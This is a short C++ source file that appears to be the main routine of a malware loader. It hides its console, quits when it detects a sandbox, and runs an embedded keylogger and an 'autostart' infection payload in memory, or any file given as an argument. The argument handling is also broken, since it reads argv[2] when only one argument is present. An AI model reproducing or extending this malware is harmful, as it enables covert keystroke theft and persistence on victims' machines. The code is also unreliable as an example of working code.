#include "pch.h"

#include "data/data-keylogger.h"
#include "data/data-autostart.h"
#include "sandboxdetect/sandboxdetect.h"
#include "memory-load/loadpe.h"

int main(int argc, char* argv[]) {
	if constexpr (ARMED) FreeConsole();
	if (ARMED && sandboxdetect::is_sandboxed()) return 1;

	switch (argc) {
	case 1:
		loadpe::runPE(raw::autostart); break;
	case 2:
		if (strncmp(argv[2], "-logger", 10) == 0)
			loadpe::runPE(raw::keylogger);
		else if (strncmp(argv[2], "-infect", 10) == 0)
			loadpe::runPE(raw::autostart);
		else if (strncmp(argv[2], "-both", 10) == 0) {
			loadpe::runPE(raw::keylogger);
			loadpe::runPE(raw::autostart);
		}
		else {
			const auto file = loadpe::loadFile(argv[2]);
			loadpe::runPE(file);
		}
		break;
	default:
		break;
	}

	return 0;
}
